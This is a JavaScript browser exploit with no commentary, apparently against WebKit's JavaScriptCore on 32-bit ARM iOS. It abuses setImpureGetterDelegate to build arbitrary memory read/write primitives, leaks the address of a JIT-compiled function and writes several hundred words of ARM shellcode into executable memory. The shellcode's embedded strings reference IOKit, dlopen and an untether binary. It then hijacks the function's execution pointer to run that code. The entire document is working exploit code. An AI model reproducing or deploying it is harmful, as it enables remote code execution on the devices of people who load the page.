var dummy_ab = new ArrayBuffer(0x20);
var dataview_init_rw = new DataView(dummy_ab);
var dataview_rw = new DataView(dummy_ab);

setImpureGetterDelegate(dataview_init_rw, dataview_rw);

var DATAVIEW_ARRAYBUFFER_OFFSET = 0x10;
var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + 4;
var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + 4;
var FAST_TYPED_ARRAY_MODE = 0;

dataview_init_rw.setUint32(DATAVIEW_ARRAYBUFFER_OFFSET, 0, true);
dataview_init_rw.setUint32(DATAVIEW_BYTELENGTH_OFFSET, 0xFFFFFFFF, true);
dataview_init_rw.setUint32(DATAVIEW_MODE_OFFSET, 0, true);

//dataview_rw.setUint32(0x41424344,0x51525354,true); //write primitive

var dummy_ab = new ArrayBuffer(0x20);
var dataview_leak_addr = new DataView(dummy_ab);
var dataview_dv_leak = new DataView(dummy_ab);
setImpureGetterDelegate(dataview_dv_leak, dataview_leak_addr);
function read32(where){
  return dataview_rw.getUint32(where, true);
}
function write32(where,what){
  dataview_rw.setUint32(where,what,true); //write primitive
}

var body = '';
for (var k = 0; k < 0x100; k++){
  body += 'try {} catch(e){};';
}
var to_overwrite1 = new Function('a', body);
for (var i = 0; i< 0x10000; i++){
  to_overwrite1();
}

setImpureGetterDelegate(dataview_leak_addr, to_overwrite1);
leaked_addr = dataview_dv_leak.getUint32(DATAVIEW_ARRAYBUFFER_OFFSET, true);


// getJIT
r2 = read32(leaked_addr+0x14);
shellcode = (read32(r2+0x20)&0xfffff000)+0xa0000;

//EXAMPLE: write32(shellcode+0, 0xe52de004);


write32(shellcode+0, 0x466fb580);
write32(shellcode+4, 0x200fb093);
write32(shellcode+8, 0x3209f240);
write32(shellcode+12, 0xf2402300);
write32(shellcode+16, 0xf2c0511a);
write32(shellcode+20, 0x44790100);
write32(shellcode+24, 0xf0006809);
write32(shellcode+28, 0x280ef95d);
write32(shellcode+32, 0xf240d109);
write32(shellcode+36, 0xf2c05006);
write32(shellcode+40, 0x44780000);
write32(shellcode+44, 0xf5016801);
write32(shellcode+48, 0x60015180);
write32(shellcode+52, 0xf240e7e7);
write32(shellcode+56, 0xf2c040f2);
write32(shellcode+60, 0x44780000);
write32(shellcode+64, 0xf0006800);
write32(shellcode+68, 0xf240f958);
write32(shellcode+72, 0xf2c0500a);
write32(shellcode+76, 0x44780000);
write32(shellcode+80, 0xf2402102);
write32(shellcode+84, 0xf2c04eda);
write32(shellcode+88, 0x44fe0e00);
write32(shellcode+92, 0xe000f8de);
write32(shellcode+96, 0xf24047f0);
write32(shellcode+100, 0xf2c05109);
write32(shellcode+104, 0x44790100);
write32(shellcode+108, 0x4ec4f240);
write32(shellcode+112, 0xe00f2c0);
write32(shellcode+116, 0x901244fe);
write32(shellcode+120, 0xf8de);
write32(shellcode+124, 0xe048f8dd);
write32(shellcode+128, 0x4670900e);
write32(shellcode+132, 0xe038f8dd);
write32(shellcode+136, 0xf24047f0);
write32(shellcode+140, 0xf2c041e8);
write32(shellcode+144, 0x44790100);
write32(shellcode+148, 0x4ea0f240);
write32(shellcode+152, 0xe00f2c0);
write32(shellcode+156, 0xf8ce44fe);
write32(shellcode+160, 0xf8de0000);
write32(shellcode+164, 0x900d0000);
write32(shellcode+168, 0x990d4608);
write32(shellcode+172, 0xf2404788);
write32(shellcode+176, 0xf2c041d7);
write32(shellcode+180, 0x44790100);
write32(shellcode+184, 0xe02f240);
write32(shellcode+188, 0x4270f240);
write32(shellcode+192, 0x200f2c0);
write32(shellcode+196, 0x6812447a);
write32(shellcode+200, 0x4608900c);
write32(shellcode+204, 0x47904671);
write32(shellcode+208, 0x41f1f240);
write32(shellcode+212, 0x100f2c0);
write32(shellcode+216, 0xf2404479);
write32(shellcode+220, 0xf2c04256);
write32(shellcode+224, 0x447a0200);
write32(shellcode+228, 0x68109011);
write32(shellcode+232, 0x900b9a11);
write32(shellcode+236, 0x9a0b4610);
write32(shellcode+240, 0xf2404790);
write32(shellcode+244, 0xf2c041e0);
write32(shellcode+248, 0x44790100);
write32(shellcode+252, 0x4234f240);
write32(shellcode+256, 0x200f2c0);
write32(shellcode+260, 0xf240447a);
write32(shellcode+264, 0xf2c04e32);
write32(shellcode+268, 0x44fe0e00);
write32(shellcode+272, 0xf8ce);
write32(shellcode+276, 0x9a126810);
write32(shellcode+280, 0x4610900a);
write32(shellcode+284, 0x47909a0a);
write32(shellcode+288, 0x41bff240);
write32(shellcode+292, 0x100f2c0);
write32(shellcode+296, 0xf2404479);
write32(shellcode+300, 0xf2c04206);
write32(shellcode+304, 0x447a0200);
write32(shellcode+308, 0x4e08f240);
write32(shellcode+312, 0xe00f2c0);
write32(shellcode+316, 0xf8ce44fe);
write32(shellcode+320, 0x68100000);
write32(shellcode+324, 0x90099a12);
write32(shellcode+328, 0x9a094610);
write32(shellcode+332, 0xf2404790);
write32(shellcode+336, 0xf2c041a0);
write32(shellcode+340, 0x44790100);
write32(shellcode+344, 0x32d8f240);
write32(shellcode+348, 0x200f2c0);
write32(shellcode+352, 0xf240447a);
write32(shellcode+356, 0xf2c03ede);
write32(shellcode+360, 0x44fe0e00);
write32(shellcode+364, 0xf8ce);
write32(shellcode+368, 0x9a126810);
write32(shellcode+372, 0x46109008);
write32(shellcode+376, 0x47909a08);
write32(shellcode+380, 0x4178f240);
write32(shellcode+384, 0x100f2c0);
write32(shellcode+388, 0xf2404479);
write32(shellcode+392, 0xf2c032aa);
write32(shellcode+396, 0x447a0200);
write32(shellcode+400, 0x3eb4f240);
write32(shellcode+404, 0xe00f2c0);
write32(shellcode+408, 0xf8ce44fe);
write32(shellcode+412, 0x68100000);
write32(shellcode+416, 0x90079a12);
write32(shellcode+420, 0x9a074610);
write32(shellcode+424, 0xf2404790);
write32(shellcode+428, 0xf2c04150);
write32(shellcode+432, 0x44790100);
write32(shellcode+436, 0x327cf240);
write32(shellcode+440, 0x200f2c0);
write32(shellcode+444, 0xf240447a);
write32(shellcode+448, 0xf2c03e8a);
write32(shellcode+452, 0x44fe0e00);
write32(shellcode+456, 0xf8ce);
write32(shellcode+460, 0x9a126810);
write32(shellcode+464, 0x46109006);
write32(shellcode+468, 0x47909a06);
write32(shellcode+472, 0x3174f240);
write32(shellcode+476, 0x100f2c0);
write32(shellcode+480, 0x60084479);
write32(shellcode+484, 0xf92bf000);
write32(shellcode+488, 0x4036f240);
write32(shellcode+492, 0xf2c0);
write32(shellcode+496, 0xf2404478);
write32(shellcode+500, 0xf2c04143);
write32(shellcode+504, 0x44790100);
write32(shellcode+508, 0x3248f240);
write32(shellcode+512, 0x200f2c0);
write32(shellcode+516, 0xf240447a);
write32(shellcode+520, 0xf2c04e0a);
write32(shellcode+524, 0x44fe0e00);
write32(shellcode+528, 0xe040f8cd);
write32(shellcode+532, 0xe040f8dd);
write32(shellcode+536, 0x3e80f50e);
write32(shellcode+540, 0xe040f8cd);
write32(shellcode+544, 0xe040f8dd);
write32(shellcode+548, 0xf6cf2300);
write32(shellcode+552, 0xea0373ff);
write32(shellcode+556, 0x9310030e);
write32(shellcode+560, 0x47906812);
write32(shellcode+564, 0x900f2100);
write32(shellcode+568, 0x4288980f);
write32(shellcode+572, 0x2001d107);
write32(shellcode+576, 0x91052100);
write32(shellcode+580, 0x9b059a05);
write32(shellcode+584, 0xf846f000);
write32(shellcode+588, 0x21019004);
write32(shellcode+592, 0xf2c02200);
write32(shellcode+596, 0xf2400201);
write32(shellcode+600, 0xf2c020f2);
write32(shellcode+604, 0x44780000);
write32(shellcode+608, 0x9b106800);
write32(shellcode+612, 0x903cf8dd);
write32(shellcode+616, 0x46189003);
write32(shellcode+620, 0xf8dd464b);
write32(shellcode+624, 0x47c8900c);
write32(shellcode+628, 0xf2c02100);
write32(shellcode+632, 0xf2400101);
write32(shellcode+636, 0xf2c022d2);
write32(shellcode+640, 0x447a0200);
write32(shellcode+644, 0x9b106812);
write32(shellcode+648, 0x46189002);
write32(shellcode+652, 0xf2404790);
write32(shellcode+656, 0xf2c030aa);
write32(shellcode+660, 0x44780000);
write32(shellcode+664, 0x219cf240);
write32(shellcode+668, 0x100f2c0);
write32(shellcode+672, 0x9a104479);
write32(shellcode+676, 0x92103201);
write32(shellcode+680, 0x9a106809);
write32(shellcode+684, 0x46119101);
write32(shellcode+688, 0x47909a01);
write32(shellcode+692, 0x217cf240);
write32(shellcode+696, 0x100f2c0);
write32(shellcode+700, 0xf2404479);
write32(shellcode+704, 0xf2c0226e);
write32(shellcode+708, 0x447a0200);
write32(shellcode+712, 0x68129b10);
write32(shellcode+716, 0x90006809);
write32(shellcode+720, 0x47984610);
write32(shellcode+724, 0xbd80b013);
write32(shellcode+728, 0x9004b085);
write32(shellcode+732, 0x92029103);
write32(shellcode+736, 0x46849301);
write32(shellcode+740, 0xbc07b40e);
write32(shellcode+744, 0x4684df80);
write32(shellcode+748, 0x90004600);
write32(shellcode+752, 0xb0059800);
write32(shellcode+756, 0xb5804770);
write32(shellcode+760, 0xb089466f);
write32(shellcode+764, 0x90082100);
write32(shellcode+768, 0x98089104);
write32(shellcode+772, 0x9007301c);
write32(shellcode+776, 0x98039103);
write32(shellcode+780, 0x69099908);
write32(shellcode+784, 0xd21a4288);
write32(shellcode+788, 0x68009807);
write32(shellcode+792, 0xd10d2801);
write32(shellcode+796, 0x90069807);
write32(shellcode+800, 0xaf8d0);
write32(shellcode+804, 0x1144f244);
write32(shellcode+808, 0x1154f2c4);
write32(shellcode+812, 0xd1024288);
write32(shellcode+816, 0x9807e7ff);
write32(shellcode+820, 0xe7ff9005);
write32(shellcode+824, 0x99079807);
write32(shellcode+828, 0x44086849);
write32(shellcode+832, 0x98039007);
write32(shellcode+836, 0x90033001);
write32(shellcode+840, 0x2000e7df);
write32(shellcode+844, 0x31389905);
write32(shellcode+848, 0x90029104);
write32(shellcode+852, 0x99059802);
write32(shellcode+856, 0x42886b09);
write32(shellcode+860, 0xf646d211);
write32(shellcode+864, 0xf2c77063);
write32(shellcode+868, 0x9904306e);
write32(shellcode+872, 0x1002f8d1);
write32(shellcode+876, 0xd1004281);
write32(shellcode+880, 0xe7ffe007);
write32(shellcode+884, 0x30019802);
write32(shellcode+888, 0x98049002);
write32(shellcode+892, 0x90043044);
write32(shellcode+896, 0x2000e7e8);
write32(shellcode+900, 0x11acf240);
write32(shellcode+904, 0x100f2c0);
write32(shellcode+908, 0xf2404479);
write32(shellcode+912, 0xf2c0129e);
write32(shellcode+916, 0x447a0200);
write32(shellcode+920, 0xf8dd9b08);
write32(shellcode+924, 0xf8d99010);
write32(shellcode+928, 0x444b9028);
write32(shellcode+932, 0x60109301);
write32(shellcode+936, 0x20016008);
write32(shellcode+940, 0xf2402100);
write32(shellcode+944, 0xf2c0127e);
write32(shellcode+948, 0x447a0200);
write32(shellcode+952, 0x428a6812);
write32(shellcode+956, 0xd00e9000);
write32(shellcode+960, 0xf2402000);
write32(shellcode+964, 0xf2c0116e);
write32(shellcode+968, 0x44790100);
write32(shellcode+972, 0x42816809);
write32(shellcode+976, 0xf240);
write32(shellcode+980, 0x2001bf18);
write32(shellcode+984, 0x30fff080);
write32(shellcode+988, 0x98009000);
write32(shellcode+992, 0xf01f010);
write32(shellcode+996, 0x9801d029);
write32(shellcode+1000, 0xf2406800);
write32(shellcode+1004, 0xf2c02165);
write32(shellcode+1008, 0x44790100);
write32(shellcode+1012, 0xf874f000);
write32(shellcode+1016, 0xd1072800);
write32(shellcode+1020, 0x1030f240);
write32(shellcode+1024, 0xf2c0);
write32(shellcode+1028, 0x99014478);
write32(shellcode+1032, 0x60016849);
write32(shellcode+1036, 0x68009801);
write32(shellcode+1040, 0x214df240);
write32(shellcode+1044, 0x100f2c0);
write32(shellcode+1048, 0xf0004479);
write32(shellcode+1052, 0x2800f861);
write32(shellcode+1056, 0xf240d107);
write32(shellcode+1060, 0xf2c0100e);
write32(shellcode+1064, 0x44780000);
write32(shellcode+1068, 0x68499901);
write32(shellcode+1072, 0x98016001);
write32(shellcode+1076, 0x90013008);
write32(shellcode+1080, 0xb009e7b7);
write32(shellcode+1084, 0xb580bd80);
write32(shellcode+1088, 0xb089466f);
write32(shellcode+1092, 0xf4f240);
write32(shellcode+1096, 0xf2c0);
write32(shellcode+1100, 0x68004478);
write32(shellcode+1104, 0xf2404780);
write32(shellcode+1108, 0xf2c00ee6);
write32(shellcode+1112, 0x44fe0e00);
write32(shellcode+1116, 0x1e0f240);
write32(shellcode+1120, 0x100f2c0);
write32(shellcode+1124, 0x90074479);
write32(shellcode+1128, 0xf8de6808);
write32(shellcode+1132, 0x90011000);
write32(shellcode+1136, 0xaa064788);
write32(shellcode+1140, 0xf8dda905);
write32(shellcode+1144, 0x47f0e004);
write32(shellcode+1148, 0x98049004);
write32(shellcode+1152, 0xf01f110);
write32(shellcode+1156, 0x2001d102);
write32(shellcode+1160, 0xfdbaf7ff);
write32(shellcode+1164, 0x28009804);
write32(shellcode+1168, 0x9806d124);
write32(shellcode+1172, 0xd0212800);
write32(shellcode+1176, 0x90032000);
write32(shellcode+1180, 0x99069803);
write32(shellcode+1184, 0xd21a4288);
write32(shellcode+1188, 0x99059803);
write32(shellcode+1192, 0x44080080);
write32(shellcode+1196, 0x90086800);
write32(shellcode+1200, 0x99079808);
write32(shellcode+1204, 0xd00b4288);
write32(shellcode+1208, 0x88f240);
write32(shellcode+1212, 0xf2c0);
write32(shellcode+1216, 0x68004478);
write32(shellcode+1220, 0x90009908);
write32(shellcode+1224, 0x99004608);
write32(shellcode+1228, 0x90024788);
write32(shellcode+1232, 0x9803e7ff);
write32(shellcode+1236, 0x90033001);
write32(shellcode+1240, 0xe7ffe7e0);
write32(shellcode+1244, 0xbd80b009);
write32(shellcode+1248, 0x9002b083);
write32(shellcode+1252, 0x20009101);
write32(shellcode+1256, 0xf9919902);
write32(shellcode+1260, 0x29001000);
write32(shellcode+1264, 0xd00b9000);
write32(shellcode+1268, 0xf9909802);
write32(shellcode+1272, 0x99010000);
write32(shellcode+1276, 0x1000f991);
write32(shellcode+1280, 0xf2404288);
write32(shellcode+1284, 0xbf080000);
write32(shellcode+1288, 0x90002001);
write32(shellcode+1292, 0xf0109800);
write32(shellcode+1296, 0xd0060f01);
write32(shellcode+1300, 0x30019802);
write32(shellcode+1304, 0x98019002);
write32(shellcode+1308, 0x90013001);
write32(shellcode+1312, 0x9802e7e1);
write32(shellcode+1316, 0xf990);
write32(shellcode+1320, 0xf9919901);
write32(shellcode+1324, 0x1a401000);
write32(shellcode+1328, 0x4770b003);
write32(shellcode+1332, 0x1fe00000);
write32(shellcode+1336, 0x11223344);
write32(shellcode+1340, 0x11223344);
write32(shellcode+1344, 0x11223344);
write32(shellcode+1348, 0x11223344);
write32(shellcode+1352, 0x11223344);
write32(shellcode+1356, 0x11223344);
write32(shellcode+1360, 0x11223344);
write32(shellcode+1364, 0x11223344);
write32(shellcode+1368, 0x11223344);
write32(shellcode+1372, 0x7273752f);
write32(shellcode+1376, 0x62696c2f);
write32(shellcode+1380, 0x62696c2f);
write32(shellcode+1384, 0x74737953);
write32(shellcode+1388, 0x422e6d65);
write32(shellcode+1392, 0x6c79642e);
write32(shellcode+1396, 0x70006269);
write32(shellcode+1400, 0x746e6972);
write32(shellcode+1404, 0x2a5b0066);
write32(shellcode+1408, 0x7453205d);
write32(shellcode+1412, 0x31656761);
write32(shellcode+1416, 0x616f6c20);
write32(shellcode+1420, 0xa646564);
write32(shellcode+1424, 0x79532f00);
write32(shellcode+1428, 0x6d657473);
write32(shellcode+1432, 0x62694c2f);
write32(shellcode+1436, 0x79726172);
write32(shellcode+1440, 0x6172462f);
write32(shellcode+1444, 0x6f77656d);
write32(shellcode+1448, 0x2f736b72);
write32(shellcode+1452, 0x694b4f49);
write32(shellcode+1456, 0x72662e74);
write32(shellcode+1460, 0x77656d61);
write32(shellcode+1464, 0x2f6b726f);
write32(shellcode+1468, 0x73726556);
write32(shellcode+1472, 0x736e6f69);
write32(shellcode+1476, 0x492f412f);
write32(shellcode+1480, 0x74694b4f);
write32(shellcode+1484, 0x63616d00);
write32(shellcode+1488, 0x68745f68);
write32(shellcode+1492, 0x64616572);
write32(shellcode+1496, 0x6c65735f);
write32(shellcode+1500, 0x61740066);
write32(shellcode+1504, 0x745f6b73);
write32(shellcode+1508, 0x61657268);
write32(shellcode+1512, 0x74007364);
write32(shellcode+1516, 0x61657268);
write32(shellcode+1520, 0x75735f64);
write32(shellcode+1524, 0x6e657073);
write32(shellcode+1528, 0x6f660064);
write32(shellcode+1532, 0x6e6570);
write32(shellcode+1536, 0x61657266);
write32(shellcode+1540, 0x79730064);
write32(shellcode+1544, 0x63695f73);
write32(shellcode+1548, 0x65686361);
write32(shellcode+1552, 0x766e695f);
write32(shellcode+1556, 0x64696c61);
write32(shellcode+1560, 0x657461);
write32(shellcode+1564, 0x69727473);
write32(shellcode+1568, 0x6573676e);
write32(shellcode+1572, 0x6f697463);
write32(shellcode+1576, 0x752f006e);
write32(shellcode+1580, 0x7465746e);
write32(shellcode+1584, 0x2f726568);
write32(shellcode+1588, 0x65746e75);
write32(shellcode+1592, 0x72656874);
write32(shellcode+1596, 0x6e69622e);
write32(shellcode+1600, 0x627200);
write32(shellcode+1604, 0x205d2a5b);
write32(shellcode+1608, 0x67617453);
write32(shellcode+1612, 0x61203265);
write32(shellcode+1616, 0x78303d74);
write32(shellcode+1620, 0x78383025);
write32(shellcode+1624, 0x5f000a21);
write32(shellcode+1628, 0x6c79645f);
write32(shellcode+1632, 0x6c645f64);
write32(shellcode+1636, 0x6e65706f);
write32(shellcode+1640, 0x645f5f00);
write32(shellcode+1644, 0x5f646c79);
write32(shellcode+1648, 0x79736c64);
write32(shellcode+1652, 0x6d);


var body = '';
for (var k = 0; k < 0x100; k++){
  body += 'try {} catch(e){};';
}

var to_overwrite = new Function('a', body);
for (var i = 0; i< 0x10000; i++){
  to_overwrite();
}
setImpureGetterDelegate(dataview_leak_addr, to_overwrite);
leaked_addr = dataview_dv_leak.getUint32(DATAVIEW_ARRAYBUFFER_OFFSET, true);


write32(leaked_addr+0x00, leaked_addr+4);
write32(leaked_addr+0x04, leaked_addr+4);
write32(leaked_addr+0x08, shellcode+1); //PC
write32(leaked_addr+0x30, leaked_addr+0x30+4-0x18);
write32(leaked_addr+0x34, leaked_addr+0x8-0x1c); //Trigger


// write32(0x41414141, shellcode); //DEBUG

to_overwrite();
